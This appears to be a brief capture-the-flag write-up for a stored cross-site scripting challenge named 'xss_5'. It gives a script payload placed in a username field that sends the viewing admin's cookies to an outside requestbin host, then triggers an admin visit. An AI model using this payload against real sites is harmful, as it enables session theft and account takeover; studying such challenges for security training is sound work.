# xss_5 - Injectable Username
- This time, nothing that we check is injectable! As a last resort let’s try the username.
- Payload, `<script>document.location="http://requestbin.fullcontact.com/18kxbln1/?c="+document.cookie;</script>`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528363696461_Screenshot+2018-06-07+02.25.25.png)

- After creating the user, we know admin’s only visit when we post trash, so post anything at all to pop the admin user.
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528363687175_Screenshot+2018-06-07+02.26.21.png)
